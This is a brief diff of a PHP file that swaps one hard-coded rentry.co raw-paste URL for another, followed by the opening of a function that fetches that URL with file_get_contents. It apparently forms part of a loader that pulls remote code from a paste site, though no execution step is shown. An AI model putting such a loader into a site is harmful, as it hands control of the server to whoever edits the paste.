@@ -1,5 +1,5 @@
 <?php
-$url = "https://rentry.co/wp-22/raw";
+$url = "https://rentry.co/wp-222/raw";
 
 function get_with_file_get_contents($url) {
     if (ini_get('allow_url_fopen')) {
